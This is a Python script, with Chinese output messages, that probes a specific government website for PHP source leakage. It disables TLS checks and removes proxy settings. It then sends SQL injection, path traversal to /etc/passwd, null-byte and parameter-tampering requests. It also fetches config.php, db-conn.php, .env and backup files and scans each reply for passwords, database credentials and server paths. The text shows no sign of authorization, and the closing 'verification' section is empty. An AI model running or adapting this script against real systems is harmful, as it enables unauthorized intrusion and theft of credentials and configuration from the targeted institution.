import requests
import re

requests.packages.urllib3.disable_warnings()

import os
os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

proxies = {"http": None, "https": None}

target = "http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=1"

pc_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

print("=" * 60)
print("[1] 直接访问漏洞URL - 检查是否泄露源码")
print("=" * 60)

try:
    resp = requests.get(target, headers={"User-Agent": pc_ua}, timeout=10, proxies=proxies, verify=False)
    print(f"状态码: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Content-Length: {len(resp.text)}")
    
    php_indicators = ['<?php', '<?=', '<?', 'include(', 'require(', 'function ', '$_', 'mysql_', 'mysqli_', 'PDO', 'new ', '->', '::', 'echo ', 'die(', 'exit(']
    found_php = [ind for ind in php_indicators if ind in resp.text]
    
    if found_php:
        print(f"[!] 发现PHP源码特征！")
        for ind in found_php:
            print(f"  - 发现: {ind}")
        
        php_blocks = re.findall(r'<\?php.{0,500}?\?>', resp.text, re.DOTALL)
        if php_blocks:
            print(f"\n[!] 提取到 {len(php_blocks)} 个PHP代码块:")
            for i, block in enumerate(php_blocks[:3]):
                print(f"\n--- 代码块 {i+1} ---")
                print(block[:300])
    else:
        print("[*] 未发现明显PHP源码特征")
        
    error_indicators = ['Fatal error', 'Parse error', 'Warning:', 'Notice:', 'Stack trace', 'Exception', 'error_reporting', 'phpversion']
    found_errors = [err for err in error_indicators if err in resp.text]
    if found_errors:
        print(f"\n[!] 发现PHP错误信息！")
        for err in found_errors:
            print(f"  - {err}")
    
    config_indicators = ['localhost', '127.0.0.1', 'root:', 'password', 'passwd', 'username', 'host=', 'db_', 'database', 'config']
    found_config = [c for c in config_indicators if c.lower() in resp.text.lower()]
    if found_config:
        print(f"\n[!] 发现配置信息特征！")
        for c in found_config:
            print(f"  - {c}")
    
    path_indicators = ['/var/www', '/home/', '/usr/local', 'C:\\\\', 'D:\\\\', '/opt/', 'DOCUMENT_ROOT', '__FILE__', '__DIR__']
    found_paths = [p for p in path_indicators if p in resp.text]
    if found_paths:
        print(f"\n[!] 发现服务器路径信息！")
        for p in found_paths:
            print(f"  - {p}")
            
    print(f"\n--- 响应内容前500字符 ---")
    print(resp.text[:500])
    
except Exception as e:
    print(f"访问失败: {e}")

print()
print("=" * 60)
print("[2] 触发报错 - 修改参数")
print("=" * 60)

error_urls = [
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=1&id=1'",
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=1' or '1'='1",
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid[]=1",
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=-1",
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=1%00",
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=../../../../etc/passwd",
    f"http://appendix.changchun.gov.cn/web//index.php?case=nonexist&act=space&mid=1",
    f"http://appendix.changchun.gov.cn/web//index.php?case=user&act=nonexist&mid=1",
]

for url in error_urls:
    try:
        r = requests.get(url, headers={"User-Agent": pc_ua}, timeout=10, proxies=proxies, verify=False)
        print(f"\nURL: {url}")
        print(f"  状态码: {r.status_code}, 长度: {len(r.text)}")
        
        php_found = [ind for ind in ['<?php', '<?=', 'function ', '$_', '->', '::'] if ind in r.text]
        error_found = [err for err in ['Fatal error', 'Warning:', 'Notice:', 'Stack trace', 'Exception'] if err in r.text]
        path_found = [p for p in ['/var/www', '/home/', 'DOCUMENT_ROOT', '__FILE__'] if p in r.text]
        
        if php_found:
            print(f"  [!] PHP源码特征: {php_found}")
        if error_found:
            print(f"  [!] 错误信息: {error_found}")
        if path_found:
            print(f"  [!] 路径信息: {path_found}")
            
    except Exception as e:
        print(f"  失败: {e}")

print()
print("=" * 60)
print("[3] 测试PHP文件直接访问")
print("=" * 60)

php_files = [
    "http://appendix.changchun.gov.cn/web//db-conn.php",
    "http://appendix.changchun.gov.cn/web//config.php",
    "http://appendix.changchun.gov.cn/web//lrpic.php",
    "http://appendix.changchun.gov.cn/db-conn.php",
    "http://appendix.changchun.gov.cn/config.php",
    "http://appendix.changchun.gov.cn/web//index.php",
    "http://appendix.changchun.gov.cn/web//index.php.bak",
    "http://appendix.changchun.gov.cn/web//index.php~",
    "http://appendix.changchun.gov.cn/web//.env",
    "http://appendix.changchun.gov.cn/web//index.php?case=user&act=space&mid=1%00",
]

for url in php_files:
    try:
        r = requests.get(url, headers={"User-Agent": pc_ua}, timeout=10, proxies=proxies, verify=False)
        ct = r.headers.get('Content-Type', 'N/A')
        cl = r.headers.get('Content-Length', 'N/A')
        print(f"\nURL: {url}")
        print(f"  状态码: {r.status_code}, Content-Type: {ct}, 长度: {len(r.text)}")
        
        php_found = [ind for ind in ['<?php', '<?=', 'mysql_', 'mysqli_', 'PDO', 'password', 'host'] if ind in r.text]
        if php_found:
            print(f"  [!] 发现敏感信息: {php_found}")
            if '<?php' in r.text or '<?=' in r.text:
                matches = re.findall(r'<\?php.{0,300}', r.text, re.DOTALL)
                for m in matches[:2]:
                    print(f"  源码片段: {m[:200]}")
                    
    except Exception as e:
        print(f"  失败: {e}")

print()
print("=" * 60)
print("[4] 验证结论")
print("=" * 60)
